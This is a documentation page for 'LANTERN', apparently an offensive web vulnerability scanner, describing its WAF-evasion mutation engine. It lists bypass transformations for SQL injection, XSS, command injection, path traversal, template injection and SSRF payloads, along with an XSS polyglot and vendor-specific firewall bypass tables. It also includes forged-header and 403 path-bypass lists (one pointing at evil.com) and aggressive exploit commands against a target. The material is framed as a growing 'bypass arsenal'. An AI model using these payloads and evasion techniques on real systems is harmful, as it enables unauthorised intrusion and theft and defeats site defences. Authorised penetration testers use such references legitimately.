[← Back to Index](../INDEX.md)

# Mutation Engine & WAF Bypass

LANTERN's mutation engine is what separates it from basic scanners. When `--aggressive` is enabled, every payload goes through 200+ transformations designed to evade WAFs and security filters.

---

## How It Works

1. **Base Payload** - Start with `<script>alert(1)</script>`
2. **Regex Mutations** - Apply pattern-based transformations
3. **Obfuscation** - Run through 34 encoding/case/whitespace techniques
4. **WAF-Specific Bypass** - Apply known bypasses for detected WAF
5. **Learning** - Save successful bypasses for future scans

---

## Mutation Categories

### 1. SQL Injection Mutations

**Case Variations**
```sql
SELECT → SeLeCt, select, SELECT, sElEcT
UNION → UnIoN, union, UNION
```

**Inline Comments**
```sql
SELECT FROM → SEL/**/ECT FR/**/OM
UNION SELECT → /*!50000UNION*/ /*!50000SELECT*/
```

**Whitespace Bypass**
```sql
SELECT FROM → SELECT%09FROM (tab)
SELECT FROM → SELECT%0aFROM (newline)
SELECT FROM → SELECT/**/FROM (comment)
```

**Quote Bypass**
```sql
' → " → ` → %27 → '' → \'
```

**Logical Operators**
```sql
OR → || → oR → Or
AND → && → aNd → AnD
```

**Equals Bypass**
```sql
= → LIKE → REGEXP → RLIKE → IS → <>
```

### 2. XSS Mutations

**Tag Bypass**
```html
<script → <SCRIPT → <ScRiPt → <scr\x00ipt
<script → %3Cscript → \x3cscript → \u003cscript
<script → <svg/onload= → <img/onerror=
```

**Event Handler Bypass**
```html
onerror= → ONERROR= → onerror = → onerror%3d
```

**Protocol Bypass**
```html
javascript: → JAVASCRIPT: → JaVaScRiPt:
javascript: → java\tscript: → jav&#x09;ascript:
javascript: → data: → vbscript:
```

**Function Bypass**
```javascript
alert( → ALERT( → al\u0065rt(
alert( → confirm( → prompt( → eval(
alert( → console.log( → document.write(
```

**Bracket Encoding**
```html
< → %3C → \x3c → \u003c → &lt; → &#60; → &#x3c;
> → %3E → \x3e → \u003e → &gt; → &#62; → &#x3e;
```

### 3. Command Injection Mutations

**Separator Variants**
```bash
; → %0a → \n → && → || → | → &
```

**Pipe Bypass**
```bash
| → %7c → \x7c → ||
```

**Space Bypass (IFS)**
```bash
(space) → ${IFS} → $IFS$9 → %09 → {,} → \t
```

**Backtick Bypass**
```bash
`command` → $(command) → ${command}
```

### 4. LFI Mutations

**Traversal Encoding**
```
../ → ..\ → ..%2f → ..%5c → %2e%2e/ → %2e%2e%2f
../ → ....// → ..;/ → ..%00/ → ..%c0%af
```

**Path Encoding**
```
/etc/passwd → %2fetc%2fpasswd → /etc\passwd
```

**Null Byte Variants**
```
%00 → \x00 → %2500 → %00%00
```

### 5. SSTI Mutations

**Template Syntax**
```
{{ → {% → ${ → #{ → <%= → ${{
```

**Dunder Bypass**
```python
__class__ → \x5f\x5fclass\x5f\x5f
__init__ → getattr(x, '_init_')
```

### 6. SSRF Mutations

**IP Bypass**
```
127.0.0.1 → 127.1 → 127.0.1 → 0177.0.0.1
127.0.0.1 → 0x7f.0.0.1 → 2130706433 → 0x7f000001
127.0.0.1 → [::ffff:127.0.0.1] → 017700000001
```

**Localhost Bypass**
```
localhost → LOCALHOST → localtest.me → spoofed.burpcollaborator.net
localhost → 127.0.0.1 → [::1] → 0.0.0.0
```

**Protocol Wrapping**
```
http:// → https:// → // → http:\\
http:// → hTtP:// → HTTP:// → file:// → gopher://
```

---

## Obfuscation Techniques (34 Total)

### Encoding (12 techniques)
- URL encode selective characters
- Double URL encoding
- Triple URL encoding
- Unicode escape (`\u0061lert`)
- Hex escape (`\x61lert`)
- Octal escape (`\141lert`)
- HTML entity decimal (`&#97;lert`)
- HTML entity hex (`&#x61;lert`)
- HTML entity named (`&lt;script&gt;`)
- Overlong UTF-8 (`%c0%af` for `/`)
- UTF-7 encoding
- UTF-16 encoding

### Case (3 techniques)
- Random case (`sElEcT`)
- Alternating case (`SeLeCt`)
- Inverse case (swapcase)

### Whitespace (7 techniques)
- Tab substitution
- Newline substitution
- Carriage return substitution
- Vertical tab (`\x0b`)
- Form feed (`\x0c`)
- Null byte insertion
- Zero-width characters (`\u200b`, `\u200c`, `\u200d`, `\ufeff`)

### Comments (5 techniques)
- SQL inline comment (`SEL/**/ECT`)
- SQL multiline comment (space → `/**/`)
- SQL version comment (`/*!50000SELECT*/`)
- HTML comment break (`<!--><script>`)
- JS comment break (`al/**/ert`)

### Concatenation (4 techniques)
- String concat with plus (`'<'+'script>'`)
- String concat with pipe (`'<'||'script>'`)
- CHAR code build (`CHAR(60,115,99,114,105,112,116)`)
- fromCharCode build (`String.fromCharCode(60,115,99,...)`)

### Splitting (3 techniques)
- Keyword split (`scr"+"ipt`)
- Reverse payload
- Chunk and join

---

## Polyglot Payloads

### XSS Polyglot
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

This payload works in:
- HTML context
- JavaScript context
- Attribute context (quoted and unquoted)
- URL context

### SQLi Polyglot
```sql
1'\"()[]{}|;:@#$%^&*-+=`~\
```

Triggers errors in any SQL dialect.

---

## Learned Payloads

When `--aggressive` mode finds a working bypass, it saves it:

```
payloads/learned/
├── index.json              # Metadata: timestamps, contexts, targets
├── sqli.txt               # Successful SQLi bypasses
├── xss.txt                # Successful XSS bypasses
├── cmdi.txt               # Successful command injection bypasses
└── ...
```

**On future scans:**
1. Learned payloads are tested FIRST
2. If they work, mutation is skipped (faster)
3. If they fail, full mutation runs
4. New bypasses are added to the learned set

Your bypass arsenal grows with every scan.

---

## WAF-Specific Bypasses

LANTERN detects common WAFs and applies known bypasses:

| WAF | Detection | Bypass Techniques |
|-----|-----------|-------------------|
| **Cloudflare** | `cf-ray` header, challenge page | Double encoding, unicode, case mixing |
| **AWS WAF** | `x-amzn-requestid` | URL encoding, comment injection |
| **Akamai** | `akamai` headers | Overlong UTF-8, null bytes |
| **ModSecurity** | Error messages | Version comments, whitespace |
| **Sucuri** | Challenge page | Specific XSS payloads |
| **Incapsula** | `visid_incap` cookie | Case variations, encoding chains |

---

## Header Injection Bypass

When path/parameter injection is blocked, LANTERN tests headers:

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

---

## Path Bypass

For 403 forbidden paths:

```
/admin           → /admin/
/admin           → /admin//
/admin           → //admin
/admin           → /.//admin
/admin           → /admin/.
/admin           → /admin%20
/admin           → /admin%09
/admin           → /admin%00
/admin           → /admin..;/
/admin           → /admin;
/admin           → /admin.json
/admin           → /admin?
/admin           → /%2e/admin
```

---

## Commands

```bash
# Enable mutation engine
lantern -t https://target.com -m sqli,xss --aggressive

# Maximum mutations
lantern -t https://target.com -m sqli,xss --aggressive --deep

# WAF detection + bypass
lantern -t https://target.com -m waf,sqli,xss --aggressive --exploit

# View learned payload stats
# (shown in scan summary)
```

---

## What Gets Logged

For successful bypasses:
- Original payload
- Mutated payload that worked
- WAF detected (if any)
- Target URL
- Timestamp

This data feeds back into future scans.

---

[← Back to Index](../INDEX.md)
